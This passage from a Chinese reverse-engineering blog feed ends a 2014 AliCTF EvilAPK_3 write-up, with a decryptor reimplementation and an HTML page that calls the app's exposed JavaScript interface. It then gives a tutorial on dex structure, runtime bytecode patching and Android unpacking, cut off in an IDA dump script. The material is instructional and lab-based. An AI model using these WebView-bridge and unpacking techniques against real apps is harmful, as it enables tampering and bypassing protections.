env-&gt;functions-&gt;NewStringUTF(&amp;env-&gt;functions, (const char *)&amp;v11);  }  else  {    v9 = data;  }  env-&gt;functions-&gt;ReleaseStringUTFChars(&amp;env-&gt;functions, data, v8);  return v9;}</code></pre><p>在 vigenere_decrypt 函数中，对输入的数据进行了解密：</p><pre><code class="cpp">signed int __fastcall vigenere_decrypt(const char *ciphertext, char *plaintext){  const char *ciphertext_1; // r8  char *plaintext_1; // r6  size_t len; // r0  char *v5; // r2  const char *table; // r3  signed int v7; // r7  int v8; // r0  int v9; // r1  int v10; // r5  int v11; // r0  int v12; // r10  char v13; // r3  signed int i; // r5  signed int result; // r0  signed int v16; // r9  int ch; // r3  char s; // [sp+4h] [bp-64h]  char v19; // [sp+48h] [bp-20h]  ciphertext_1 = ciphertext;  plaintext_1 = plaintext;  len = strlen(ciphertext);  v5 = &amp;s;  table = &quot;ncA8DaUPelq*S7Y9q#hLl0T##@XTuXHQpFA&amp;65eaUaY33WigYMXO9y7JtCQU&quot;;  v7 = len;  do  {    v8 = *(_DWORD *)table;    table += 8;    v9 = *((_DWORD *)table - 1);    *(_DWORD *)v5 = v8;    *((_DWORD *)v5 + 1) = v9;    v10 = (int)(v5 + 8);    v5 += 8;  }  while ( table != &quot;tCQU&quot; );  v11 = *(_DWORD *)table;  v12 = 0;  v13 = table[4];  *(_DWORD *)v10 = v11;  *(_BYTE *)(v10 + 4) = v13;  i = 0;  result = strlen(&amp;s);  v16 = result;  while ( i &lt; v7 )  {    ch = (unsigned __int8)ciphertext_1[i];    if ( ch - 32 &lt;= (unsigned int)&#39;^&#39; )         // chr(ch) &lt;= 127    {      plaintext_1[i] = (ch - (unsigned __int8)*(&amp;v19 + v12 - 68) + 95) % 95 + 32;// &amp;v19 - 68 = &amp;table      result = (v12 + 1) / v16;      v12 = (v12 + 1) % v16;    }    else                                        // chr(ch) &gt; 127    {      plaintext_1[i] = ch;    }    ++i;  }  return result;}</code></pre><p>我先是通过动态调试来获取到了两个字符串的解密结果：</p><p><img src="/pics/2014-AliCTF-EvilAPK_3/5.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/2014-AliCTF-EvilAPK_3/6.png" srcset="/img/loading.gif" alt></p><p>然后尝试自己实现一个解密函数进行验证：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char *table = &quot;ncA8DaUPelq*S7Y9q#hLl0T##@XTuXHQpFA&amp;65eaUaY33WigYMXO9y7JtCQU&quot;;char *vigenere_decrypt(char *ciphertext) {    int j = 0;    int len = strlen(ciphertext);    printf(&quot;%d\n&quot;, len);    char plaintext[len];    for (int i = 0; i &lt; len; i++) {        char ch = ciphertext[i];        if ((ch - 32) &lt;= 0x5E) {            plaintext[i] = (ch - table[j] + 95) % 95 + 32;            j = (j + 1) % 16;        } else {            plaintext[i] = ch;        }    }    plaintext[len] = &#39;\x00&#39;;    return plaintext;}int main() {    char *ciphertext1 = &quot;dV.&quot;;    char *plaintext1 = vigenere_decrypt(ciphertext1);    printf(&quot;%s\n&quot;, plaintext1); // url    char *ciphertext2 = &quot;BQ1$*[w6G_&quot;;    char *plaintext2 = vigenere_decrypt(ciphertext2);    printf(&quot;%s\n&quot;, plaintext2); // SmokeyBear    return 0;}</code></pre><p>当然这里也可以 Hook 这个 so 文件，也可以直接编写代码调用 so 中的函数，条条大路通罗马。最后实现一个调用 Toast 的 html 页面：</p><pre><code class="html">&lt;html&gt;  &lt;head&gt;    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;    &lt;script type=&quot;text/javascript&quot;&gt;      function alicrack() {        SmokeyBear.showToast();      }    &lt;/script&gt;  &lt;/head&gt;  &lt;body&gt;    Crack EvilAPK_3    &lt;script type=&quot;text/javascript&quot;&gt;      alicrack();    &lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><p>在软件中输入对应的地址，成功弹窗：</p><p><img src="/pics/2014-AliCTF-EvilAPK_3/7.png" srcset="/img/loading.gif" alt></p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://xz.aliyun.com/t/383" target="_blank" rel="noopener">https://xz.aliyun.com/t/383</a><br><a href="https://blog.csdn.net/AliMobileSecurity/article/details/53259788" target="_blank" rel="noopener">https://blog.csdn.net/AliMobileSecurity/article/details/53259788</a><br><a href="https://yq.aliyun.com/articles/64691" target="_blank" rel="noopener">https://yq.aliyun.com/articles/64691</a><br><a href="http://pwn4.fun/2017/04/04/Android%E9%80%86%E5%90%91%E4%B9%8B%E8%84%B1%E5%A3%B3/" target="_blank" rel="noopener">http://pwn4.fun/2017/04/04/Android%E9%80%86%E5%90%91%E4%B9%8B%E8%84%B1%E5%A3%B3/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;接触了一段时间的安卓后复现一下经典的题目，具体审计还有分析的步骤不做记录。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="re" scheme="blog.b3ale.cn/tags/re/"/>
    
      <category term="android" scheme="blog.b3ale.cn/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向入门（四）</title>
    <link href="blog.b3ale.cn/2020/02/14/%5BTODO%5DAndroid%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
    <id>blog.b3ale.cn/2020/02/14/%5BTODO%5DAndroid%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E5%9B%9B%EF%BC%89/</id>
    <published>2020-02-14T06:21:40.000Z</published>
    <updated>2020-03-20T01:26:41.632Z</updated>
    
    <content type="html"><![CDATA[<p>Android 加壳和脱壳入门。</p><a id="more"></a><h1 id="dex-文件格式"><a href="#dex-文件格式" class="headerlink" title="dex 文件格式"></a>dex 文件格式</h1><p>Android 程序编译以后生成 apk 文件，里面的 classes.dex 文件存放着程序运行的字节码，dex 文件是可以直接在 Dalvik 虚拟机中加载运行的文件。由于 Dalvik 是一种针对嵌入式设备而特殊设计的 Java 虚拟机，所以 dex 文件与标准的 class 文件在结构设计上有着本质的区别。当 Java 程序编译成 class 后，还需要使用 dx 工具将所有的 class 文件整合到一个 dex 文件，目的是其中各个类能够共享数据，在一定程度上降低了冗余，同时也是文件结构更加经凑，dex 文件是传统 jar 文件大小的 50% 左右。要想手工脱壳，必须先了解 dex 的文件格式。</p><p><img src="/pics/Android逆向入门/四/1.png" srcset="/img/loading.gif" alt></p><p>ShakaApktool 使用 bs 命令即可对 class.dex 实现反编译回 smali 文件字节码，而使用 s 命令可以把 smali 字节码编译为 class.dex 文件：</p><pre><code class="bash">java -jar ShakaApktool bs classes.dex -o smali-dirjava -jar ShakaApktool s smali-dir -o example.dex</code></pre><p>dex 文件的数据结构大概如下：</p><table><thead><tr><th style="text-align:center">数据名称</th><th style="text-align:center">解释</th></tr></thead><tbody><tr><td style="text-align:center">header</td><td style="text-align:center">dex 文件头部，记录整个 dex 文件的相关属性</td></tr><tr><td style="text-align:center">string_ids</td><td style="text-align:center">字符串数据索引，记录了每个字符串在数据区的偏移量</td></tr><tr><td style="text-align:center">type_ids</td><td style="text-align:center">类似数据索引，记录了每个类型的字符串索引</td></tr><tr><td style="text-align:center">proto_ids</td><td style="text-align:center">原型数据索引，记录了方法声明的字符串，返回类型字符串，参数列表</td></tr><tr><td style="text-align:center">field_ids</td><td style="text-align:center">字段数据索引，记录了所属类，类型以及方法名</td></tr><tr><td style="text-align:center">method_ids</td><td style="text-align:center">类方法索引，记录方法所属类名，方法声明以及方法名等信息</td></tr><tr><td style="text-align:center">class_defs</td><td style="text-align:center">类定义数据索引，记录指定类各类信息，包括接口，超类，类数据偏移量</td></tr><tr><td style="text-align:center">data</td><td style="text-align:center">数据区，保存了各个类的真是数据</td></tr><tr><td style="text-align:center">link_data</td><td style="text-align:center">连接数据区</td></tr></tbody></table><p>这里先看一下 Android 源码，首先在 <a href="http://androidxref.com/4.1.1/xref/dalvik/vm/Common.h" target="_blank" rel="noopener">/dalvik/vm/Common.h</a> 中对数据类型有一个重命名：</p><pre><code class="cpp">/* * These match the definitions in the VM specification. */typedef uint8_t             u1;typedef uint16_t            u2;typedef uint32_t            u4;typedef uint64_t            u8;typedef int8_t              s1;typedef int16_t             s2;typedef int32_t             s4;typedef int64_t             s8;</code></pre><p>所有 dex 文件相关的数据结构都在 <a href="http://androidxref.com/4.1.1/xref/dalvik/libdex/DexFile.h" target="_blank" rel="noopener">/dalvik/libdex/DexFile.h</a> 中。dex 文件的结构如下：</p><pre><code class="cpp">/* * Structure representing a DEX file. * * Code should regard DexFile as opaque, using the API calls provided here * to access specific structures. */struct DexFile {    /* directly-mapped &quot;opt&quot; header */    const DexOptHeader* pOptHeader;    /* pointers to directly-mapped structs and arrays in base DEX */    const DexHeader*    pHeader;    const DexStringId*  pStringIds;    const DexTypeId*    pTypeIds;    const DexFieldId*   pFieldIds;    const DexMethodId*  pMethodIds;    const DexProtoId*   pProtoIds;    const DexClassDef*  pClassDefs;    const DexLink*      pLinkData;    /*     * These are mapped out of the &quot;auxillary&quot; section, and may not be     * included in the file.     */    const DexClassLookup* pClassLookup;    const void*         pRegisterMapPool;       // RegisterMapClassPool    /* points to start of DEX file data */    const u1*           baseAddr;    /* track memory overhead for auxillary structures */    int                 overhead;    /* additional app-specific data structures associated with the DEX */    //void*               auxData;};</code></pre><p>dex 文件结构分别为文件头、索引区和数据区：</p><p><img src="/pics/Android逆向入门/四/2.png" srcset="/img/loading.gif" alt></p><h2 id="dex-文件头"><a href="#dex-文件头" class="headerlink" title="dex 文件头"></a>dex 文件头</h2><p>文件头中简单记录了 dex 文件的一些基本信息，以及大致的数据分布。长度固定为 0x70，其中每一项信息所占用的内存空间也是固定的，好处是虚拟机在处理 dex 时不用考虑 dex 文件的多样性：</p><table><thead><tr><th style="text-align:center">字段名称</th><th style="text-align:center">偏移值</th><th style="text-align:center">长度</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">magic</td><td style="text-align:center">0x00</td><td style="text-align:center">8</td><td style="text-align:center">魔数字段，值为”dex\n035\0”</td></tr><tr><td style="text-align:center">checksum</td><td style="text-align:center">0x08</td><td style="text-align:center">4</td><td style="text-align:center">校验码</td></tr><tr><td style="text-align:center">signature</td><td style="text-align:center">0x0c</td><td style="text-align:center">20</td><td style="text-align:center">sha-1 签名</td></tr><tr><td style="text-align:center">file_size</td><td style="text-align:center">0x20</td><td style="text-align:center">4</td><td style="text-align:center">dex 文件总长度</td></tr><tr><td style="text-align:center">header_size</td><td style="text-align:center">0x24</td><td style="text-align:center">4</td><td style="text-align:center">文件头长度，009 版本=0x5c,035 版本=0x70</td></tr><tr><td style="text-align:center">endian_tag</td><td style="text-align:center">0x28</td><td style="text-align:center">4</td><td style="text-align:center">标示字节顺序的常量</td></tr><tr><td style="text-align:center">link_size</td><td style="text-align:center">0x2c</td><td style="text-align:center">4</td><td style="text-align:center">链接段的大小，如果为 0 就是静态链接</td></tr><tr><td style="text-align:center">link_off</td><td style="text-align:center">0x30</td><td style="text-align:center">4</td><td style="text-align:center">链接段的开始位置</td></tr><tr><td style="text-align:center">map_off</td><td style="text-align:center">0x34</td><td style="text-align:center">4</td><td style="text-align:center">map 数据基址</td></tr><tr><td style="text-align:center">string_ids_size</td><td style="text-align:center">0x38</td><td style="text-align:center">4</td><td style="text-align:center">字符串列表中字符串个数</td></tr><tr><td style="text-align:center">string_ids_off</td><td style="text-align:center">0x3c</td><td style="text-align:center">4</td><td style="text-align:center">字符串列表基址</td></tr><tr><td style="text-align:center">type_ids_size</td><td style="text-align:center">0x40</td><td style="text-align:center">4</td><td style="text-align:center">类列表里的类型个数</td></tr><tr><td style="text-align:center">type_ids_off</td><td style="text-align:center">0x44</td><td style="text-align:center">4</td><td style="text-align:center">类列表基址</td></tr><tr><td style="text-align:center">proto_ids_size</td><td style="text-align:center">0x48</td><td style="text-align:center">4</td><td style="text-align:center">原型列表里面的原型个数</td></tr><tr><td style="text-align:center">proto_ids_off</td><td style="text-align:center">0x4c</td><td style="text-align:center">4</td><td style="text-align:center">原型列表基址</td></tr><tr><td style="text-align:center">field_ids_size</td><td style="text-align:center">0x50</td><td style="text-align:center">4</td><td style="text-align:center">字段个数</td></tr><tr><td style="text-align:center">field_ids_off</td><td style="text-align:center">0x54</td><td style="text-align:center">4</td><td style="text-align:center">字段列表基址</td></tr><tr><td style="text-align:center">method_ids_size</td><td style="text-align:center">0x58</td><td style="text-align:center">4</td><td style="text-align:center">方法个数</td></tr><tr><td style="text-align:center">method_ids_off</td><td style="text-align:center">0x5c</td><td style="text-align:center">4</td><td style="text-align:center">方法列表基址</td></tr><tr><td style="text-align:center">class_defs_size</td><td style="text-align:center">0x60</td><td style="text-align:center">4</td><td style="text-align:center">类定义标中类的个数</td></tr><tr><td style="text-align:center">class_defs_off</td><td style="text-align:center">0x64</td><td style="text-align:center">4</td><td style="text-align:center">类定义列表基址</td></tr><tr><td style="text-align:center">data_size</td><td style="text-align:center">0x68</td><td style="text-align:center">4</td><td style="text-align:center">数据段的大小，必须 4k 对齐</td></tr><tr><td style="text-align:center">data_off</td><td style="text-align:center">0x6c</td><td style="text-align:center">4</td><td style="text-align:center">数据段基址</td></tr></tbody></table><p>文件头的数据结构如下：</p><pre><code class="cpp">/* * Direct-mapped &quot;header_item&quot; struct. */struct DexHeader {    u1  magic[8];           /* includes version number */    u4  checksum;           /* adler32 checksum */    u1  signature[kSHA1DigestLen]; /* SHA-1 hash */    u4  fileSize;           /* length of entire file */    u4  headerSize;         /* offset to start of next section */    u4  endianTag;    u4  linkSize;    u4  linkOff;    u4  mapOff;    u4  stringIdsSize;    u4  stringIdsOff;    u4  typeIdsSize;    u4  typeIdsOff;    u4  protoIdsSize;    u4  protoIdsOff;    u4  fieldIdsSize;    u4  fieldIdsOff;    u4  methodIdsSize;    u4  methodIdsOff;    u4  classDefsSize;    u4  classDefsOff;    u4  dataSize;    u4  dataOff;};</code></pre><h2 id="索引区"><a href="#索引区" class="headerlink" title="索引区"></a>索引区</h2><p>索引区包括 string_ids、type_ids、proto_ids、field_ids、method_ids 几个数据结构。数组结构如下：</p><pre><code class="cpp">/* * Direct-mapped &quot;string_id_item&quot;. */struct DexStringId {    u4 stringDataOff;      /* file offset to string_data_item */};/* * Direct-mapped &quot;type_id_item&quot;. */struct DexTypeId {    u4  descriptorIdx;      /* index into stringIds list for type descriptor */};/* * Direct-mapped &quot;field_id_item&quot;. */struct DexFieldId {    u2  classIdx;           /* index into typeIds list for defining class */    u2  typeIdx;            /* index into typeIds for field type */    u4  nameIdx;            /* index into stringIds for field name */};/* * Direct-mapped &quot;method_id_item&quot;. */struct DexMethodId {    u2  classIdx;           /* index into typeIds list for defining class */    u2  protoIdx;           /* index into protoIds for method prototype */    u4  nameIdx;            /* index into stringIds for method name */};/* * Direct-mapped &quot;proto_id_item&quot;. */struct DexProtoId {    u4  shortyIdx;          /* index into stringIds for shorty descriptor */    u4  returnTypeIdx;      /* index into typeIds list for return type */    u4  parametersOff;      /* file offset to type_list for parameter types */};</code></pre><h2 id="数据区"><a href="#数据区" class="headerlink" title="数据区"></a>数据区</h2><p>数据段包括 class_defs、data、link_data，数据结构如下：</p><pre><code class="cpp">/* * Direct-mapped &quot;map_item&quot;. */struct DexMapItem {    u2 type;              /* type code (see kDexType* above) */    u2 unused;    u4 size;              /* count of items of the indicated type */    u4 offset;            /* file offset to the start of data */};/* * Direct-mapped &quot;map_list&quot;. */struct DexMapList {    u4  size;               /* #of entries in list */    DexMapItem list[1];     /* entries */};/* * Direct-mapped &quot;class_def_item&quot;. */struct DexClassDef {    u4  classIdx;           /* index into typeIds for this class */    u4  accessFlags;    u4  superclassIdx;      /* index into typeIds for superclass */    u4  interfacesOff;      /* file offset to DexTypeList */    u4  sourceFileIdx;      /* index into stringIds for source file name */    u4  annotationsOff;     /* file offset to annotations_directory_item */    u4  classDataOff;       /* file offset to class_data_item */    u4  staticValuesOff;    /* file offset to DexEncodedArray */};/* * Link table.  Currently undefined. */struct DexLink {    u1  bleargh;};</code></pre><h1 id="动态代码自修改（加壳原理）"><a href="#动态代码自修改（加壳原理）" class="headerlink" title="动态代码自修改（加壳原理）"></a>动态代码自修改（加壳原理）</h1><p>DexClassDef -&gt; DexClassData -&gt; DexMethod -&gt; DexCode -&gt; insns</p><pre><code class="cpp">/* * Direct-mapped &quot;code_item&quot;. * * The &quot;catches&quot; table is used when throwing an exception, * &quot;debugInfo&quot; is used when displaying an exception stack trace or * debugging. An offset of zero indicates that there are no entries. */struct DexCode {    u2  registersSize;      // 使用的寄存器个数    u2  insSize;            // 参数个数    u2  outsSize;           // 调用其他方法时使用的寄存器个数    u2  triesSize;          // Try/Catch的个数    u4  debugInfoOff;       // 指令调试信息的偏移 /* file offset to debug info stream */    u4  insnsSize;          // 指令集个数，以2字节为单位 /* size of the insns array, in u2 units */    u2  insns[1];           // 指令集    /* followed by optional u2 padding */    /* followed by try_item[triesSize] */    /* followed by uleb128 handlersSize */    /* followed by catch_handler_item[handlersSize] */};</code></pre><p>其中，insns 的值是用于存放程序实现代码的地方。程序执行的时候会把整个 dex 文件加载到内存之中，然后动态地解析执行 insns 中的内容。只要修改了里面的数据，就相当于修改了程序执行流程。</p><h2 id="修改-insns"><a href="#修改-insns" class="headerlink" title="修改 insns"></a>修改 insns</h2><h3 id="直接在内存中修改"><a href="#直接在内存中修改" class="headerlink" title="直接在内存中修改"></a>直接在内存中修改</h3><ol><li>定位到 dex 文件</li><li>计算函数的 DexCode 位置</li><li>重写 DexCode 的 insns 数据</li></ol><h4 id="JNI-Bridge"><a href="#JNI-Bridge" class="headerlink" title="JNI Bridge"></a><a href="http://androidxref.com/4.1.1/xref/dalvik/vm/Jni.cpp" target="_blank" rel="noopener">JNI Bridge</a></h4><p>JNI 提供了让我们在 C++代码层中直接操作 Dalvik（Java）数据的接口，可以直接在 JNI 中操作相关数据来修改 Android 中的代码。</p><h4 id="Object-结构体"><a href="#Object-结构体" class="headerlink" title="Object 结构体"></a><a href="http://androidxref.com/4.1.1/xref/dalvik/vm/oo/Object.cpp" target="_blank" rel="noopener">Object 结构体</a></h4><p>Android 运行时，解析 dex 文件，并生成相关的结构体：<a href="http://androidxref.com/4.1.1/xref/dalvik/vm/DvmDex.cpp" target="_blank" rel="noopener">DvmDex</a>。其中存储了各种字符串、类、方法等信息。加载的时候，调用 <code>dvmDexFileOpenPartial</code> 对 dex 文件进行解析，并转化为可执行的结构体，这也是这个函数可以作为脱壳用的函数的原因之一。（以前的爱加密可以直接通过 Hook 这个函数进行脱壳）。</p><p>其中 Method 结构体是根据 DexMethod 生成的执行方法类。Dalvik 执行代码时，都是从 Method 中取出代码来执行的。因此可以直接通过操作 Method 结构体来修改执行的代码。</p><h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><p>首先新建一个 JNI 项目，并新建两个函数 <code>ret1()</code> 和 <code>ret2()</code> 函数，以及一个 Native 函数 <code>changeMethod()</code>：</p><pre><code class="java">package com.assassinq.editdexfile;import android.os.Bundle;import com.google.android.material.floatingactionbutton.FloatingActionButton;import androidx.appcompat.app.AppCompatActivity;import androidx.appcompat.widget.Toolbar;import android.util.Log;import android.view.View;import android.view.Menu;import android.view.MenuItem;import java.lang.reflect.Method;public class MainActivity extends AppCompatActivity {    static {        System.loadLibrary(&quot;hello&quot;);    }    @Override    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_main);        Toolbar toolbar = findViewById(R.id.toolbar);        setSupportActionBar(toolbar);        FloatingActionButton fab = findViewById(R.id.fab);        fab.setOnClickListener(new View.OnClickListener() {            @Override            public void onClick(View v) {                try {                    Method m = MainActivity.class.getMethod(&quot;ret1&quot;);                    Log.d(&quot;DEBUG&quot;, &quot;Return Value = &quot; + ret1());                    changeMethod(m);                    Log.d(&quot;DEBUG&quot;, &quot;Return Value = &quot; + ret1());                } catch (Exception e) {//                    e.printStackTrace();                    Log.d(&quot;EXCEPTION&quot;, Log.getStackTraceString(e));                }            }        });    }    @Override    public boolean onCreateOptionsMenu(Menu menu) {        // Inflate the menu; this adds items to the action bar if it is present.        getMenuInflater().inflate(R.menu.menu_main, menu);        return true;    }    @Override    public boolean onOptionsItemSelected(MenuItem item) {        // Handle action bar item clicks here. The action bar will        // automatically handle clicks on the Home/Up button, so long        // as you specify a parent activity in AndroidManifest.xml.        int id = item.getItemId();        //noinspection SimplifiableIfStatement        if (id == R.id.action_settings) {            return true;        }        return super.onOptionsItemSelected(item);    }    public int ret1() {        return 1;    }    public int ret2() {        return 2;    }    // public native void changeMethod(Method r1);}</code></pre><p>先编译生成一个不包含 JNI 的 apk，解压后取出其中的 classes.dex，然后在 010 Editor 中用 DEX Template 解析，找到 DexCode 中的 insns，并记录下 <code>ret1()</code> 和 <code>ret2()</code> 的字节码：</p><p><img src="/pics/Android逆向入门/四/3.png" srcset="/img/loading.gif" alt></p><p>然后完善 JNI 函数，并且需要导入 Android 源码中 Dalvik 文件夹下相关的头文件。JNI 实现如下，将 <code>ret1()</code> 所指向的字节码修改为 <code>ret2()</code> 的字节码：</p><pre><code class="cpp">#include &lt;jni.h&gt;#include &lt;string.h&gt;#include &lt;android/log.h&gt;#include &quot;Object.h&quot;#include &quot;Common.h&quot;#ifdef LOG_TAG#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)#define LOGW(...) __android_log_print(ANDROID_LOG_WARN, LOG_TAG, __VA_ARGS__)#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)#define LOGF(...) __android_log_print(ANDROID_LOG_FATAL, LOG_TAG, __VA_ARGS__)#endifconst char insns[] = {0x12, 0x20, 0x0F, 0x00};void changeMethod(JNIEnv *env, jobject obj, jobject method) {    /*     * 12 10 0F 00 -&gt; ret 1     * 12 20 0F 00 -&gt; ret 2     */    Method *pMethod = (Method *) env-&gt;FromReflectedMethod(method);    pMethod-&gt;insns = (const u2*) insns;}static int registerNativeMethods(JNIEnv *env, const char *className, JNINativeMethod *gMethods,                                 int numMethods) {    jclass clazz;    clazz = env-&gt;FindClass(className);    if (clazz == NULL) {        return JNI_FALSE;    }    if (env-&gt;RegisterNatives(clazz, gMethods, numMethods) &lt; 0) {        return JNI_FALSE;    }    return JNI_TRUE;}static const char *gClassName = &quot;com/assassinq/editdexfile/MainActivity&quot;;static JNINativeMethod gMethods[] = {        {&quot;changeMethod&quot;, &quot;(Ljava/lang/reflect/Method;)V&quot;, (void *) changeMethod},};JNIEXPORT jint JNI_OnLoad(JavaVM *vm, void *reserved) {    JNIEnv *env = NULL;    if (vm-&gt;GetEnv((void **) &amp;env, JNI_VERSION_1_6) != JNI_OK) {        LOGE(&quot;This jni version is not supported&quot;);        return -1;    }    if (registerNativeMethods(env, gClassName, gMethods, sizeof(gMethods) / sizeof(gMethods[0])) ==        JNI_FALSE) {        LOGE(&quot;Unable to register native methods&quot;);        return -1;    }    LOGE(&quot;Methods loaded successfully&quot;);    return JNI_VERSION_1_6;}</code></pre><p>运行程序并点击触发事件，查看日志发现修改生效：</p><pre><code class="log">02-11 11:29:39.202 1795-1795/com.assassinq.editdexfile D/DEBUG: Return Value = 102-11 11:29:39.202 1795-1795/com.assassinq.editdexfile D/DEBUG: Return Value = 2</code></pre><h3 id="IDA-中动态修改"><a href="#IDA-中动态修改" class="headerlink" title="IDA 中动态修改"></a>IDA 中动态修改</h3><ol><li>Ctrl+s 打开 map 数据</li><li>查找内存加载的额 classes.dex 的位置</li><li>直接计算偏移，修改相应的位置</li></ol><h3 id="内存修改的另一种方法"><a href="#内存修改的另一种方法" class="headerlink" title="内存修改的另一种方法"></a>内存修改的另一种方法</h3><p>修改方法定位：dexClassDef 遍历以获取 MethodId，对比 MethodName 与 proto 以获取目标 Method，然后对相应的 DexCode 进行修改。由于 Dex 加载到内存中是只有只读权限，故需要先修改内存页的权限才能正常地修改 DexCode 数据。</p><p>遍历 Map：</p><pre><code class="cpp">void *get_module_base(pid_t pid, const char *module_name) {    FILE *fp;    long addr = 0;    char *pch;    char filename[32];    char line[1024];    if (pid &lt; 0) {        snprintf(filename, sizeof(filename), &quot;/proc/self/maps&quot;);    } else {        snprintf(filename, sizeof(filename), &quot;/proc/%d/maps&quot;, pid);    }    fp = fopen(filename, &quot;r&quot;);    if (fp != NULL) {        while (fgets(line, sizeof(line), fp)) {            LOGD(&quot;%s&quot;, line);            if (strstr(line, module_name)) {                pch = strtok(line, &quot;-&quot;);                addr = strtoul(pch, NULL, 16);                break;            }        }        fclose(fp);    }    return (void *) addr;}</code></pre><p>重置 Map 属性：</p><pre><code class="cpp">#include &lt;asm-generic/mman-common.h&gt;#include &lt;sys/mman.h&gt;#include &lt;limits.h&gt;if (mprotect(PAGE_START((int)(pCode-&gt;insns)), PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC) == 0) {    *(u4 *)(pCode-&gt;insns) = 0x000f2012;    mprotect(PAGE_START((int)(pCode-&gt;insns)), PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC);}</code></pre><h4 id="Example-1"><a href="#Example-1" class="headerlink" title="Example"></a>Example</h4><p>接下来编写 changeMethod2 函数，利用 dalvik 中的一些函数来逐步定位到指定函数：</p><pre><code class="cpp">void changeMethod2(JNIEnv *env, jobject obj) {    u1 *pDex = (u1 *) get_module_base(-1, &quot;/data/dalvik-cache/data@app@com.assassinq.editdexfile&quot;);    if (pDex != NULL) {        LOGD(&quot;Get Module&quot;);        pDex += sizeof(DexOptHeader);        DexFile *pDexFile = dexFileParse(pDex, sizeof(DexHeader), kDexParseContinueOnError);        if (pDexFile == NULL) {            LOGE(&quot;Unable to parse DexFile&quot;);            return;        }        const DexClassDef *pClassDef;        for (int i = 0; i &lt; pDexFile-&gt;pHeader-&gt;classDefsSize; ++i) {            const DexClassDef *pDef = dexGetClassDef(pDexFile, i);            if (!strcmp(dexStringByTypeIdx(pDexFile, pDef-&gt;classIdx),                        &quot;Lcom/assassinq/editdexfile/MainActivity;&quot;)) {                pClassDef = pDef;                break;            }        }        if (pClassDef != NULL) {            LOGD(&quot;Class Found&quot;);            const u1 *pData = dexGetClassData(pDexFile, pClassDef);            if (pData) {                DexClassData *pClassData = dexReadAndVerifyClassData(&amp;pData, NULL);                for (int i = 0; i &lt; pClassData-&gt;header.virtualMethodsSize; ++i) {                    DexMethod *pMethod = &amp;pClassData-&gt;virtualMethods[i];                    const DexMethodId *pMethodId = dexGetMethodId(pDexFile, pMethod-&gt;methodIdx);                    if (!strcmp(dexStringById(pDexFile, pMethodId-&gt;nameIdx), &quot;ret1&quot;)) {                        const DexCode *pCode = dexGetCode(pDexFile, pMethod);                        LOGD(&quot;Method found and try to patch&quot;);                        if (mprotect((void *) PAGE_START((int) (pCode-&gt;insns)), PAGE_SIZE,                                     PROT_READ | PROT_WRITE) == 0) {                            *(u4 *) (pCode-&gt;insns) = 0x000F2012;                            mprotect((void *) PAGE_START((int) (pCode-&gt;insns)), PAGE_SIZE,                                     PROT_READ);                        }                    }                }                free(pClassData);            }        }        dexFileFree(pDexFile);    }}static JNINativeMethod gMethods[] = {        ...        {&quot;changeMethod2&quot;, &quot;()V&quot;,                           (void *) changeMethod2},};...</code></pre><p>在 app 下的 build.gradle 中修改以强制转换指针：</p><pre><code>android {    ...    defaultConfig {        ...        externalNativeBuild {            cmake {                cppFlags &quot;-fpermissive&quot;            }        }    }    ...}</code></pre><p>TODO:</p><h1 id="DVM-脱壳"><a href="#DVM-脱壳" class="headerlink" title="DVM 脱壳"></a>DVM 脱壳</h1><p>目前存在对 apk 中的 classes.dex 进行加密的技术，称为加壳。通过对 dex 文件的加壳，可以达到减少体积，隐藏真实代码的效果。Android 的壳与 PE 文件一样，在程序运行时，先到达壳的入口点，运行解壳代码，然后再到达程序入口点并运行代码。如果要脱壳，就需要在程序解码完毕并到达程序真实入口点中间某个位置，把原始的 dex 代码给 dump 下来，还原到 apk 文件中。</p><h2 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h2><p>壳入口：</p><pre><code class="xml">&lt;application android:name=&quot;com.ali.mobisecenhance.SubApplication&quot; /&gt;</code></pre><p>程序入口：</p><pre><code class="xml">&lt;activity android:name=&quot;com.ali.encryption.MainActivity&quot; /&gt;</code></pre><h2 id="assets-分析"><a href="#assets-分析" class="headerlink" title="assets 分析"></a>assets 分析</h2><p>assets 中一般存储着加密过的 dex，以及解密用的 so 等信息，因此先分析 assets 可以有效获取程序解壳思路。</p><h2 id="ProxyApplication-分析"><a href="#ProxyApplication-分析" class="headerlink" title="ProxyApplication 分析"></a>ProxyApplication 分析</h2><h2 id="壳代码分析"><a href="#壳代码分析" class="headerlink" title="壳代码分析"></a>壳代码分析</h2><p>壳代码中 Java 层转 Native 层：</p><pre><code class="java">protected native void attachBaseContext(Context arg1) {} // 还原代码public native void onCreate() {} // 执行原始代码</code></pre><h2 id="so-文件分析"><a href="#so-文件分析" class="headerlink" title="so 文件分析"></a>so 文件分析</h2><p>带压缩的，一般用 libz 中的 uncompress 函数进行解码，可以用该函数进行快速定位。</p><h2 id="IDA-中-dump-数据"><a href="#IDA-中-dump-数据" class="headerlink" title="IDA 中 dump 数据"></a>IDA 中 dump 数据</h2><p>在 Native 层中解密 dex 数据并还原后，替换为原始 Application。IDC Dump 脚本：</p><pre><code class="cpp">static main(void) {    auto fp, begin, end, len, b;    fp = fopen(&quot;dump.data&quot;, &quot;wb&quot;);    begin = 0x544D2008; // 